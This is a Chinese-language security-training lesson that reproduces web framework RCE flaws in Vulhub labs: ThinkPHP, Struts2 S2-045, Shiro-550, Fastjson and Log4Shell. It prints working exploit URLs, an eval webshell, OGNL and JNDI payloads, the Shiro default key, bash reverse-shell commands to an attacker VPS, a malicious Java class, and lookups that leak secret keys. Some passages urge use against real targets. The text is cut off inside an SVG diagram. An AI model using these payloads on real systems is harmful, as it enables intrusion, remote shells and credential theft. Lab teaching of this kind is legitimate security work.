# Day 37：Web框架漏洞复现ThinkPHP-S2等

> **🎯 靶场实战** | 难度：⭐⭐⭐ | 预计学习：70 分钟

---

# 第37章 Web框架漏洞复现（ThinkPHP、S2等）🚀

## 开篇引入：框架本身的坑！🕳️

哈喽各位小伙伴！欢迎来到第30章！🎉

前面我们学了好多漏洞，比如SQL注入、XSS、文件上传等等，这些漏洞的本质是什么呢？说白了，就是**程序员写代码的时候不谨慎**，留下了安全隐患。就好比你自己盖房子，门锁没装好，窗户留了缝，小偷容易进来。

但是今天这一章，我们要聊的是另一种完全不同的漏洞——**框架漏洞**！😱

什么意思呢？就是说，**你的代码写得没问题，但是你用的框架本身有漏洞**，一样会被攻击！这就好比你买了个名牌防盗门，花了大价钱，锁也换了最好的，结果这门本身设计有问题，不用撬，一推就开……你说气人不气人？🤦‍♂️

在Vulhub里面，有超多这样的框架漏洞环境，今天我们就来挑几个最经典的、最有名的来复现一下，让大家感受感受框架漏洞的威力！💥

准备好了吗？Let's go！🚀

---

## 一、什么是框架漏洞？🤔

### 1.1 大白话解释框架漏洞

在讲具体漏洞之前，我们先搞明白一个问题：**到底什么是框架漏洞？**

首先，什么是框架？我们可以把框架理解成"别人写好的半成品代码"。比如你要盖房子，框架就是已经搭好的钢筋水泥结构，你只需要在里面砌墙、装修就行，不用从打地基开始。🏗️

Web开发也是一样的道理。比如做一个网站，你总不能从最底层的网络通信开始写吧？那得写到猴年马月去。所以聪明的程序员们就把一些常用的功能（比如路由、数据库操作、模板渲染等等）封装好，做成了"框架"。你用了框架，就能专注于写业务逻辑，不用重复造轮子了。🛞

常见的Web框架有哪些呢？
- PHP的：ThinkPHP、Laravel、CodeIgniter……
- Java的：Spring、Struts2、MyBatis……
- Python的：Django、Flask……
- 还有好多好多……

那框架漏洞是啥意思呢？**就是框架本身有bug，有安全漏洞！** 🐛

你想啊，框架是别人写的，是人写的代码就可能有bug。如果框架的核心功能里有安全问题，那所有用了这个框架的网站，不就都有漏洞了吗？

就好比……嗯……就好比你买了个包子机，这个包子机本身有问题，做出来的包子每个都有个小洞。不管你换什么馅料，包子照样有洞，都漏汤！🥟

### 1.2 为什么框架漏洞更危险？⚠️

框架漏洞比普通的漏洞危险多了！为什么呢？主要有三个原因：

**第一个原因：影响范围广！🌍**

普通的漏洞，比如某个网站的SQL注入，那只有这一个网站有问题。但框架漏洞不一样，只要用了这个框架的网站，全都有漏洞！

比如ThinkPHP是国内非常流行的PHP框架，用它做的网站成千上万。一旦ThinkPHP爆出一个严重漏洞，那成千上万的网站都要遭殃！

**第二个原因：利用简单！🎯**

很多框架漏洞，都有现成的利用工具（也就是我们常说的EXP，Exploit）。你不用懂太多原理，下载下来，输入网址，点一下，漏洞就利用成功了。

就像你家门锁有问题，网上都传开了"某某小区的门锁一捅就开"，小偷随便找个工具就能进，连技术含量都不需要……🔓

**第三个原因：危害大！💣**

框架漏洞通常直接就是RCE（远程命令执行）。什么意思呢？就是攻击者可以直接在你的服务器上执行命令，想干啥干啥！删数据、挂木马、挖矿、当肉鸡……全都可以！

普通漏洞可能还需要一步步渗透，框架漏洞往往一上来就是最高权限，直接接管服务器！太可怕了！😨

### 1.3 生活小例子 🍔

我再给大家举个生活中的例子，帮助理解：

想象一下，你开了一家汉堡店🍔。你做汉堡的手艺很好，食材也新鲜，卫生也到位，自己这边完全没问题。

但是！你用的汉堡胚是从某家工厂进货的。结果这家工厂的汉堡胚生产线有问题，每个汉堡胚都沾了细菌……

那不管你汉堡做得多好吃，酱料调得多棒，只要用了这家的汉堡胚，顾客吃了都会拉肚子！🤒

这就是框架漏洞的本质——**你自己的代码没问题，但你依赖的框架有问题，照样出事！**

好啦，概念讲完了，接下来我们就来实际复现几个经典的框架漏洞，让大家亲手感受一下！💻

---

## 二、ThinkPHP 5.x 远程命令执行漏洞复现 🐘

### 2.1 ThinkPHP是什么？

第一个要复现的，就是咱们国产的PHP框架——**ThinkPHP**的漏洞！🇨🇳

ThinkPHP可以说是国内最流行的PHP框架之一了，很多公司、很多网站都在用它。毕竟是国产的，文档全是中文的，对新手友好，上手也快。

但是呢，ThinkPHP历史上也出过不少严重的漏洞。其中最有名的，就是**ThinkPHP 5.x 远程命令执行漏洞**。这个漏洞影响范围很大，当年可是让好多网站都沦陷了……😵

### 2.2 漏洞原理（大白话版）📖

这个漏洞的原理是什么呢？我用大白话给大家讲讲，不用太深入，明白大概意思就行。

ThinkPHP有个"路由"功能。什么是路由呢？就是用户访问一个URL地址，框架要知道该调用哪个控制器、哪个方法来处理这个请求。

打个比方，你去饭店吃饭，跟服务员说"我要吃宫保鸡丁"，服务员就会告诉后厨的"川菜师傅"做"宫保鸡丁"这道菜。这里的"川菜师傅"就相当于控制器，"宫保鸡丁"就相当于方法。👨‍🍳

正常情况下，用户只能访问框架允许访问的控制器和方法。但是在ThinkPHP 5的某些版本里，路由的过滤做得不好，**用户可以通过构造特殊的URL，直接调用框架内部的任意方法！**

这就好比……你去饭店，本来只能跟服务员说菜单上的菜。结果你发现可以直接命令后厨的任何师傅做任何事，比如"让买菜的去帮我买包烟"、"让洗碗工把老板的保险柜打开"……这还了得？🤯

通过调用框架里的一些敏感方法，攻击者就能执行任意PHP代码，进而执行系统命令，控制整个服务器！

好，原理就讲这么多，接下来我们动手复现！🔧

### 2.3 环境搭建（Vulhub）🏗️

老规矩，我们用Vulhub来搭建漏洞环境。如果你还没安装Vulhub，可以回去看看第29章的内容哈~

**第一步：进入对应的漏洞目录**

打开你的终端（命令行），进入到vulhub目录下的thinkphp/5-rce目录：

```bash
cd vulhub/thinkphp/5-rce
```

**第二步：启动环境**

用docker-compose启动环境：

```bash
docker-compose up -d
```

等一会儿，环境就启动好了。默认端口是8080。

**第三步：访问测试**

打开浏览器，访问 `http://localhost:8080`，如果看到ThinkPHP的默认页面，就说明环境搭建成功了！🎉

> 💡 小贴士：如果你的8080端口被占用了，可以修改docker-compose.yml文件里的端口映射哦~

### 2.4 漏洞验证：看到phpinfo就算成功！✅

环境搭好了，接下来我们来验证漏洞是否存在。

怎么验证呢？最简单的方法就是——让它执行 `phpinfo()` 函数，如果能看到phpinfo的页面，就说明漏洞确实存在！

**Payload（攻击载荷）是什么呢？**

在URL后面加上这么一串：

```
?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```

完整的URL就是：

```
http://localhost:8080/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```

**来，我们一步步拆解一下这个payload，看看它是啥意思：**

- `?s=index/think\app/invokefunction`：这是ThinkPHP的路由参数，s参数指定要调用的控制器和方法。这里我们调用的是 `think\app` 这个类的 `invokefunction` 方法。
- `&function=call_user_func_array`：这是传给invokefunction方法的参数，指定要调用的函数是 `call_user_func_array`（这是PHP的一个函数，可以调用其他函数）。
- `&vars[0]=phpinfo`：call_user_func_array的第一个参数，也就是要调用的函数名，这里是 `phpinfo`。
- `&vars[1][]=1`：call_user_func_array的第二个参数，也就是传给phpinfo的参数，这里随便传个1就行。

说白了，这一串的意思就是：**调用phpinfo函数！** 📞

好，现在我们把这个完整的URL复制到浏览器里访问一下……

哇！看到phpinfo的页面了吗？！🎉🎉🎉

成功了！我们只是构造了一个URL，就让网站执行了phpinfo函数！这就是远程代码执行漏洞的威力！

> 💡 小提示：如果没成功，检查一下环境是不是启动好了，端口对不对，URL有没有写错~

### 2.5 进一步利用：执行系统命令！⚡

能执行phpinfo只是第一步，接下来我们来玩点更刺激的——**执行系统命令！**

怎么执行系统命令呢？很简单，把 `phpinfo` 换成 `system` 就行了！

**payload如下：**

```
?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

完整URL：

```
http://localhost:8080/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

访问一下，看看页面上显示了什么？是不是显示了当前用户的名字？比如 `www-data` 或者 `root`？

`whoami` 是一个系统命令，用来查看当前登录的用户是谁。我们成功执行了这个命令！

那我们还能执行其他命令吗？当然可以！比如：

- 查看当前目录：把 `whoami` 换成 `pwd`（Linux）或者 `dir`（Windows）
- 查看文件：换成 `ls` 或者 `dir`
- 查看网络信息：换成 `ipconfig` 或者 `ifconfig`
- 想执行什么命令，就把 `whoami` 换成什么！

这也太爽了吧？不对……这也太危险了吧？！😱

### 2.6 进一步利用：写一句话木马 🐴

能执行系统命令还不够，我们还可以**写入一句话木马**，然后用菜刀或者蚁剑连接，获得一个可视化的Shell，操作起来更方便！

怎么写呢？我们可以用 `file_put_contents` 函数来写文件。

**payload如下：**

```
?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php @eval($_POST['cmd']);?>
```

完整URL：

```
http://localhost:8080/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php @eval($_POST['cmd']);?>
```

这个payload的意思是：在网站根目录下创建一个 `shell.php` 文件，内容是 `<?php @eval($_POST['cmd']);?>`，也就是一句话木马！

访问一下这个URL，页面可能什么都不显示（因为file_put_contents执行成功返回的是字节数，可能被前面的内容挡住了）。没关系，我们直接访问 `http://localhost:8080/shell.php`，如果页面是空白的，说明文件创建成功了！

然后你就可以用中国菜刀、蚁剑、冰蝎这些工具连接这个一句话木马了！连接密码就是 `cmd`。

连接成功后，你就可以像操作自己电脑一样操作服务器了，想删啥删啥，想看啥看啥……这就是RCE的威力！💀

### 2.7 修复建议 🛡️

这个漏洞这么危险，那怎么修复呢？

**最简单、最有效的方法就是：升级ThinkPHP的版本！** ✅

这个漏洞影响ThinkPHP 5.0.x < 5.0.24 和 5.1.x < 5.1.31的版本。只要把框架升级到最新版本，漏洞就补上了。

当然，也可以通过一些临时的防护手段，比如用WAF（Web应用防火墙）过滤相关的请求，或者修改框架的代码增加过滤。但最根本的解决办法，还是升级版本！

---

## 三、ThinkPHP 2.x 代码执行漏洞 📜

除了ThinkPHP 5的漏洞，ThinkPHP 2.x也有一个经典的代码执行漏洞。我们简单了解一下~

### 3.1 漏洞简介

ThinkPHP 2.x版本里，有个 `preg_replace` 的 `/e` 模式漏洞。简单说就是，框架在处理某些参数的时候，用了preg_replace的/e修饰符，这个修饰符会把替换后的字符串当成PHP代码执行！

就好比你让机器人"把这句话里的'猫'换成'狗'"，结果机器人不仅换了，还把换完的话当命令执行了……🤖

### 3.2 环境搭建

Vulhub里也有对应的环境，在 `thinkphp/2-rce` 目录下：

```bash
cd vulhub/thinkphp/2-rce
docker-compose up -d
```

启动后访问 `http://localhost:8080` 即可。

### 3.3 漏洞验证

payload很简单：

```
/index.php?s=/index/index/name/${phpinfo()}
```

完整URL：

```
http://localhost:8080/index.php?s=/index/index/name/${phpinfo()}
```

访问一下，看到phpinfo页面就说明成功了！

如果想执行系统命令，可以这样：

```
/index.php?s=/index/index/name/${system(whoami)}
```

是不是也很简单？😏

这个漏洞告诉我们，框架的历史版本里可能藏着各种漏洞，用老版本框架的网站要格外小心！

---

## 四、Struts2 系列漏洞（S2-xxx）☕

### 4.1 Struts2是什么？为什么这么有名？

讲完了PHP的框架，我们再来讲讲Java的框架。其中最有名的、漏洞最多的，当属**Struts2**了！😅

Struts2是Apache基金会的一个Java Web框架，早些年特别流行，很多大公司、大企业都在用。

但是呢，Struts2的漏洞……怎么说呢，实在是太多了！而且几乎个个都是RCE（远程命令执行）级别的大漏洞！安全圈里有个梗：**"Struts2一出漏洞，全网的管理员都要熬夜加班"** 🌙

Struts2的漏洞编号一般是 `S2-XXX` 的形式，比如S2-001、S2-005、S2-016、S2-032、S2-045、S2-048、S2-057……数都数不过来！每次出一个新的，都是一场安全圈的狂欢……不对，是管理员的噩梦！😱

其中最经典的、影响最大的，当属 **S2-045** 了。今天我们就来复现这个漏洞！

### 4.2 漏洞原理（大白话版）📖

Struts2的漏洞大多跟一个叫 **OGNL** 的东西有关。

什么是OGNL呢？它是一种表达式语言，Struts2用它来做数据绑定、表达式计算之类的事情。

打个比方，OGNL就像是一个计算器，你给它一个表达式，它就能算出结果。比如你输入 `1+1`，它给你返回 `2`。🧮

正常情况下，用户输入的内容应该只是普通的字符串，不应该被当成OGNL表达式来执行。但是呢，Struts2在很多地方没做好过滤，**用户输入的内容被不小心传给了OGNL解析器，当成表达式执行了！**

这就好比……你给客服发消息说"帮我查一下订单1+1等于几"，结果客服的系统把"1+1"当成数学题算了，还给你返回了结果……更可怕的是，这个"计算器"功能超级强大，不仅能算数学题，还能执行系统命令！🤯

S2-045这个漏洞，就是因为Struts2在处理上传文件的时候，对Content-Type这个请求头处理不当，导致里面的内容被当成OGNL表达式执行了。

### 4.3 环境搭建（Vulhub）🏗️

好，我们来动手复现S2-045！

**第一步：进入漏洞目录**

```bash
cd vulhub/struts2/s2-045
```

**第二步：启动环境**

```bash
docker-compose up -d
```

环境启动后，访问 `http://localhost:8080`，能看到一个上传文件的页面，就说明环境搭建成功了！

### 4.4 漏洞复现：用Burp抓包改包 🔍

这个漏洞的利用稍微复杂一点，因为它需要修改HTTP请求的Content-Type头，不能直接在浏览器里操作。我们需要用到Burp Suite工具。

如果你还不会用Burp，可以回去看看前面的章节，Burp是渗透测试的必备工具，一定要掌握哦~

**第一步：配置浏览器代理，打开Burp**

把浏览器的代理设置成Burp的代理（默认是127.0.0.1:8080），然后打开Burp，确保拦截功能是开启的。

**第二步：访问页面，抓包**

在浏览器里访问 `http://localhost:8080`，Burp会拦截到这个请求。我们先把它放过去（点击Forward按钮）。

**第三步：上传一个文件，抓包**

页面上有个文件上传的表单，我们随便选个文件上传，比如上传一个txt文件。点击上传后，Burp会拦截到POST请求。

**第四步：修改Content-Type头**

关键的一步来了！找到请求头里的 `Content-Type` 字段，把它的值改成我们的OGNL表达式payload！

**payload如下（执行id命令）：**

```
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Cmd-Result',@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).toString()}
```

这个payload看起来很长很复杂对吧？没关系，新手不用完全看懂，知道它的作用就行：执行 `id` 命令，然后把命令执行的结果放到HTTP响应头的 `X-Cmd-Result` 字段里返回。

把整个payload填到Content-Type的值里，注意格式要正确哦~

修改后的请求头大概是这样的：

```
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Cmd-Result',@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).toString()}
```

**第五步：放包，查看结果**

点击Forward按钮把请求放出去，然后看Burp收到的响应包。

在响应头里，你有没有看到一个叫 `X-Cmd-Result` 的字段？它的值是不是就是 `id` 命令的执行结果？比如 `uid=0(root) gid=0(root) groups=0(root)` 之类的？

哇！成功了！🎉🎉🎉

我们执行了系统命令！而且是root权限！太厉害了（也太可怕了）！

### 4.5 进一步利用 🚀

那我们想执行其他命令怎么办呢？很简单，把payload里的 `'id'` 换成你想执行的命令就行了！

比如：
- 查看当前目录：换成 `'pwd'`
- 查看文件：换成 `'ls /'`
- 反弹Shell：换成反弹Shell的命令

当然，执行的命令里如果有空格、特殊字符，可能需要做一些编码处理，但核心原理都是一样的。

S2-045只是Struts2众多漏洞中的一个，其他的比如S2-048、S2-057、S2-061等等，利用方式虽然略有不同，但本质都是OGNL表达式注入导致的RCE。

可以这么说，Struts2就是框架漏洞界的"知名代表"，它用实际行动告诉我们：**用框架一时爽，漏洞来了火葬场**……不对，是告诉我们选框架要谨慎，而且一定要及时升级！😅

---

## 五、其他常见框架漏洞简介 📚

除了ThinkPHP和Struts2，还有好多框架也出过严重的漏洞。我们简单了解一下，心里有个数就行~

### 5.1 Laravel漏洞 🔐

Laravel是PHP的另一个流行框架，号称"PHP框架里的艺术品"，设计得确实挺优雅的。

但是Laravel也出过一些严重漏洞，比如：
- **Laravel Debug模式 RCE**：如果开启了Debug模式，攻击者可以构造恶意请求执行代码。所以生产环境千万别开Debug！
- **Laravel 反序列化漏洞**：Laravel的某些功能存在反序列化漏洞，可以导致RCE。

虽然有漏洞，但Laravel的安全工作整体做得还是不错的，只是用的时候要注意配置，及时升级。

### 5.2 Symfony漏洞 🏛️

Symfony也是PHP的一个老牌框架，很多其他框架（比如Laravel）底层都依赖了Symfony的组件。

Symfony也出过一些安全漏洞，比如：
- **文件包含漏洞**
- **拒绝服务漏洞**
- **信息泄露漏洞**

因为Symfony的组件被很多项目使用，所以它的漏洞影响范围也挺广的。

### 5.3 Flask/Django 模板注入 🧪

Python阵营的两个主流Web框架——Flask和Django，也有一个常见的漏洞类型：**模板注入（SSTI，Server-Side Template Injection）**。

什么是模板注入呢？简单说就是，用户输入的内容被不小心当成了模板的一部分来渲染执行。

打个比方，模板引擎就像是一个填空题，你给它模板 `"你好，{{ name }}"`，再给它 `name=小明`，它就会输出 `"你好，小明"`。👦

但如果用户能控制模板内容本身，那就麻烦了！用户可以写一些恶意的模板代码，比如执行系统命令什么的。

Flask用的Jinja2模板、Django自带的模板引擎，都可能出现模板注入漏洞。就看开发者写代码的时候有没有注意了。

### 5.4 Shiro反序列化漏洞 🍫（Shiro-550 / Shiro-721）

Apache Shiro是Java的一个权限管理框架，做登录、权限控制、Session管理什么的常用它。国内大量Java企业系统都在用Shiro。🍫

Shiro有两个**超级有名、超级实用**的反序列化漏洞，编号是 **Shiro-550** 和 **Shiro-721**，两个都是RCE级别，实战中的命中率极高！

#### 漏洞原理（大白话版）📖

Shiro有个"记住我"（RememberMe）功能：你登录的时候勾一下"记住我"，下次再访问网站就不用重新登录了。

它是怎么实现的呢？
1. 你勾选"记住我"→ Shiro把你的用户信息**序列化** → 用一个密钥（AES加密）加密 → Base64编码 → 存在Cookie里（Cookie名叫 `rememberMe`）
2. 你下次访问 → Shiro读Cookie → Base64解码 → AES解密 → 反序列化 → 拿到用户信息

**漏洞在哪？**
- **Shiro-550**：Shiro默认用了一个**写死在代码里的硬编码AES密钥**！全世界所有用Shiro的网站，只要不改默认配置，密钥都是一样的！😱
- 攻击者知道密钥 → 就能自己构造一个恶意的序列化对象 → 加密后放到Cookie里 → 服务器解密→反序列化 → RCE！
- **Shiro-721**：是修复550之后出的，用了随机密钥，但攻击者可以通过Padding Oracle攻击（一种密码学攻击）来构造恶意Cookie，一样能RCE。

> **生活小例子** 🎯
> 
> 你住一个高级酒店（Shiro），酒店给每个客人发一张门禁卡（rememberMe Cookie）。
> 
> 但是！这个酒店所有房间的门锁都是用**同一个出厂默认密码**加密的（Shiro-550硬编码密钥），而且密码在网上都传开了！
> 
> 小偷（攻击者）知道这个密码，就自己拿个空白卡，写入"我是酒店老板"的信息，用默认密码加密一下，往门锁上一刷——门开了！而且小偷还在卡里面藏了个"炸弹"，前台一刷就爆炸（RCE）💥

#### 漏洞判断：一秒钟识别目标有没有Shiro 🔍

给目标发一个请求，看响应头或Cookie里有没有这些特征：
1. **Cookie里有 `rememberMe=deleteMe`**：这是Shiro的标志性特征！只要看到这个，99%就是用了Shiro
2. **登录失败后返回 `Set-Cookie: rememberMe=deleteMe`**：也是标志
3. 或者直接在Cookie里塞个假的 `rememberMe=1`，看响应是不是有 deleteMe

看到 rememberMe 标志？那恭喜你，这个目标可以打Shiro反序列化了！🎯

#### 漏洞利用全流程（Shiro-550）🚀

**第一步：确认密钥**

Shiro默认的密钥是这串（全世界都知道）：
```
kPH+bIxk5D2deZiIxcaaaA==
```
（对，没错，Shiro源码里直接写死了！🤦）

当然，有些开发者会自己改密钥，这时候我们需要"爆破密钥"——不过没关系，常用的密钥也就那几十上百个，工具里都内置了字典。

**第二步：用工具生成恶意 rememberMe Cookie**

用现成的工具（比如 `shiro_attack`、`ShiroExploit` 这些开源工具）：
- 输入目标URL
- 工具会自动尝试所有常用密钥，找到正确的那个
- 然后选你要执行的命令，比如 `touch /tmp/success`
- 工具会自动生成一个加密好的恶意序列化Cookie

**第三步：发送请求，执行命令**

把工具生成的 rememberMe Cookie 放到请求里发出去：
```http
GET / HTTP/1.1
Host: target.com
Cookie: rememberMe=【工具生成的一大串Base64字符串】
```

服务器收到后：解密→反序列化→执行命令→RCE成功！🎉

想反弹Shell？把命令换成Bash反弹的一句话就行：
```bash
bash -i >& /dev/tcp/你的VPS/4444 0>&1
```

> **小提示** 💡
> 
> Shiro反序列化可能是目前**Java漏洞里性价比最高**的，原因有三：
> 1. **识别简单**：rememberMe=deleteMe，一秒钟识别
> 2. **利用简单**：一键工具化，不用写复杂Payload
> 3. **命中率高**：大量老系统用默认密钥，网上一抓一大把
> 
> 做渗透测试时，看到rememberMe就眼睛放光！✨

---

### 5.5 Fastjson反序列化漏洞 ⚡

Fastjson是阿里巴巴开源的一个高性能JSON解析库，号称"最快的JSON库"。国内Java项目几乎10个有8个在用Fastjson，装机量极大！

但是Fastjson的漏洞……怎么说呢？**从2017年到现在，几乎每年都会爆一个新的反序列化RCE漏洞**，一个接一个，前赴后继，安全圈的人都看麻了……😅

#### 漏洞原理（一句话版）💥

Fastjson在解析JSON的时候，支持一个叫 `@type` 的特殊字段，用它可以**指定把JSON解析成什么Java类**。如果这个类是攻击者精心挑选的"危险类"（比如能执行JNDI查询的类），就可以导致远程代码执行！

简单说就是：
1. 攻击者发一个JSON，里面写 `{"@type":"危险类的全名","属性":"触发RCE的参数"}`
2. Fastjson看到 `@type`，就"哦，你要把JSON转成这个类的对象呀"
3. 转对象的过程中，触发了危险类的某些功能 → JNDI注入 → RCE

#### 经典漏洞：Fastjson 1.2.24 RCE 📌

这是Fastjson最经典、最广为人知的一个漏洞，影响 Fastjson <= 1.2.24 的所有版本。

**Payload 模板：**
```json
{
  "b": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://你的VPS:1389/Exploit",
    "autoCommit": true
  }
}
```

原理：Fastjson把JSON转成 `JdbcRowSetImpl` 这个类的对象，并给 `dataSourceName` 赋值。赋值的过程中，JdbcRowSetImpl会去连接你指定的LDAP服务器，加载恶意类 → 代码执行！

#### 利用全流程 🔧

**第一步：搭建恶意 LDAP/RMI 服务**

用工具 `marshalsec` 启动一个LDAP服务，监听1389端口，指定要加载的恶意类地址：
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://你的VPS:8000/#Exploit" 1389
```

**第二步：写恶意Java类 Exploit.java 并编译**
```java
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >&/dev/tcp/你的VPS/4444 0>&1");
        } catch (Exception e) {}
    }
}
```
编译：`javac Exploit.java`，然后用Python起个HTTP服务：`python3 -m http.server 8000`

**第三步：给目标发Payload**

找目标上所有接收JSON的接口（比如POST请求Body是JSON那种），发送我们的恶意JSON：
```http
POST /api/user HTTP/1.1
Content-Type: application/json

{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://你的VPS:1389/Exploit","autoCommit":true}}
```

发送！等几秒钟，你的 VPS 的4444端口就会收到一个反弹Shell！🎉

#### Fastjson版本判断 🕵️

怎么判断目标用了哪个版本的Fastjson？可以触发一个异常，看报错信息里的版本号，或者用DNSLog盲打：

```json
{"@type":"java.net.Inet4Address","val":"你的DNSLog地址"}
```
如果DNSLog收到请求，说明Fastjson开启了AutoType，有漏洞风险！

> **小提示** 💡
> 
> Fastjson漏洞**数量多、变体多**，从1.2.24一直修到1.2.68还在出问题。常见的变种：
> - 1.2.24：JdbcRowSetImpl（经典）
> - 1.2.25-1.2.47：绕过autotype（黑名单绕过）
> - 1.2.48-1.2.68：各种新的Gadget（TemplatesImpl、BadAttributeValueExpException等）
> 
> 打Fastjson的时候，直接用现成的扫描器/Fuzz工具，把所有版本的Payload一股脑扔过去，中哪个算哪个！🎯

---

### 5.6 Log4j2 核弹漏洞 ☢️（CVE-2021-44228 / Log4Shell）

2021年12月9日，安全圈炸锅了——一个叫 **Log4Shell** 的漏洞被公开，编号 **CVE-2021-44228**，CVSS评分 **满分10.0**。全网服务器瑟瑟发抖，管理员熬夜加班三天三夜……🌙

为什么这么可怕？因为 **Log4j2 这个库用的人实在是太多了！** 几乎所有的Java项目（Spring、SpringBoot、Flume、Kafka、ElasticSearch、Solr、Dubbo……）都用它来打日志。只要你的Java项目用了Log4j2（版本 2.0-beta9 ~ 2.14.1），**只要有人能让服务器把一段特殊字符串打到日志里，就能RCE！** 😱

#### 漏洞原理：一句话就能懂 🔬

Log4j2有个功能叫"**查找替换**"（Lookup）。比如打日志的时候，如果日志内容里包含 `${java:version}`，Log4j2就会自动把它替换成Java版本号。

其中有个Lookup叫 **JNDI Lookup**：`${jndi:ldap://attacker.com/a}`
- 看到这个字符串 → Log4j2就去连接这个LDAP地址 → 加载远程恶意类 → RCE！

**就这么简单！** 触发条件只有两个：
1. 目标用了受影响版本的Log4j2
2. 攻击者**能让自己输入的任意字符串被Log4j2打到日志里**

> **生活小例子** 🎯
> 
> 想象一下：
> - 你在淘宝上买东西，给卖家留了个言，写 `${jndi:ldap://xxx/Exploit}`
> - 卖家后台系统的Log4j2打印了一条日志："用户留言：${jndi:ldap://xxx/Exploit}"
> - 打印日志的时候，Log4j2自动去连接了xxx的LDAP服务器，加载了恶意代码
> - 淘宝卖家的后台服务器就被拿下了……☠️
> 
> 这就是Log4Shell的可怕之处：**你甚至不需要登录，只要让你的字符串被打印到日志里就行！** 用户名、留言、搜索框、HTTP请求头（User-Agent/X-Forwarded-For）、UUID……任何能进日志的地方，都是攻击入口！

#### 最经典Payload：一触即发 💥

**最简单的检测Payload（DNSLog验证）：**
```
${jndi:ldap://你的DNSLog地址/abc}
```
把这串字符串塞到任何能进日志的地方（比如搜索框里搜这串、User-Agent改成这串、用户名填这串……），如果DNSLog收到了请求，说明目标有漏洞！✅

**最简单的RCE Payload：**
```
${jndi:ldap://你的VPS:1389/Exploit}
```
原理和Fastjson的JNDI注入完全一样：
1. 你用marshalsec起LDAP服务在1389端口
2. Python起HTTP服务在8000端口放Exploit.class
3. 把上面那串塞到目标任何能进日志的地方
4. 等反弹Shell！🎉

#### 攻击入口全收集 🎯（一共21个常用位置）

| 位置 | 怎么塞Payload |
|------|-------------|
| 搜索框 | 直接搜Payload字符串 |
| 用户名 | 注册/登录时用户名填Payload |
| User-Agent请求头 | Burp改UA头为Payload |
| Referer请求头 | Burp改Referer |
| X-Forwarded-For请求头 | Burp加这个头，值为Payload |
| Cookie值 | Cookie里某个字段改成Payload |
| 表单输入框 | 留言、评论、地址、昵称等 |
| URL路径 | `http://target.com/${jndi:...}/login` |
| URL Query参数 | `?q=${jndi:...}&page=1` |
| POST JSON字段 | JSON的值里填Payload |

#### JDK版本限制（划重点）⚠️

Log4Shell能不能直接打，还跟目标的JDK版本有关：
- **JDK 6u141 / 7u131 / 8u121 之前**：默认允许远程加载类 → **直接RCE**，百分百成功
- **JDK 8u121 ~ 8u191**：默认加了限制，但如果目标用了Tomcat等有特殊Factory的，还是可以打
- **JDK 8u191+ / 11+**：默认不能远程加载类 → 需要用其他Gadget（比如org.apache.naming.factory.BeanFactory绕过）

但就算是高版本JDK，Log4Shell还有**信息泄露**的利用方式：
```
${env:AWS_SECRET_KEY}  # 泄露环境变量里的密钥
${sys:user.password}   # 泄露系统属性
${java:os}             # 泄露操作系统信息
```
这些不用加载恶意类，直接就能用！

> **小提示** 💡
> 
> Log4Shell是目前为止**影响范围最大、杀伤力最强、利用最简单**的漏洞之一，没有之一。
> 做渗透测试的时候，只要看到Java应用，**随手扔一个Log4Shell的DNSLog Payload**，说不定就中了！
> 
> 现在各种靶机（Vulhub里有好几个Log4Shell环境）、CTF题里也到处都是Log4Shell，这个漏洞一定要亲手复现！

---

### Java三大漏洞利用全景图 SVG 🗺️

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 540" width="800" height="540">
  <defs>
    <linearGradient id="java_bg" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#fef2f2;stop-opacity:1" />
      <stop offset="100%" style="stop-color:#fee2e2;stop-opacity:1" />
    </linearGradient>
  </defs>
  <rect width="800" height="540" fill="url(#java_bg)" rx="15"/>
  <text x="400" y="35" text-anchor="middle" font-size="22" font-weight="bold" fill="#991b1b">Java三大RCE漏洞利用全景图</text>
  <text x="400" y="55" text-anchor="middle" font-size="12" fill="#7f1d1d">Shiro反序列化 · Fastjson反序列化 · Log4Shell</text>
  
  <!-- 三个核心 -->
  <!-- Shiro -->
  <rect x="50" y="90" width="200" height="70" rx="10" fill="#fecaca" stroke="#991b1b" stroke-width="3"/>
  <text x="150" y="120" text-anchor="middle" font-size="17" font-weight="bold" fill="#7f1d1d">🍫 Shiro 反序列化</text>
  <text x="150" y="138" text-anchor="middle" font-size="11" fill="#7f1d1d">Shiro-550(硬编码密钥) / Shiro-721</text>
  <text x="150" y="152" text-anchor="middle" font-size="11" fill="#7f1d1d">特征: Cookie里有 rememberMe=deleteMe</text>
  
  <!-- Fastjson -->
  <rect x="300" y="90" width="200" height="70" rx="10" fill="#fed7aa" stroke="#c2410c" stroke-width="3"/>
  <text x="400" y="120" text-anchor="middle" font-size="17" font-weight="bold" fill="#7c2d12">⚡ Fastjson 反序列化</text>
  <text x="400" y="138" text-anchor="middle" font-size="11" fill="#7c2d12">1.2.24 ~ 1.2.68 多个版本漏洞</text>
  <text x="400" y="152" text-anchor="middle" font-size="11" fill="#7c2d12">特征: JSON接口 + @type自动类型</text>
  
  <!-- Log4j -->
  <rect x="550" y="90" width="200" height="70" rx="10" fill="#fecdd3" stroke="#be123c" stroke-width="3"/>
  <text x="650" y="120" text-anchor="middle" font-size="17" font-weight="bold" fill="#881337">☢️ Log4Shell (CVE-2021-44228)</text>
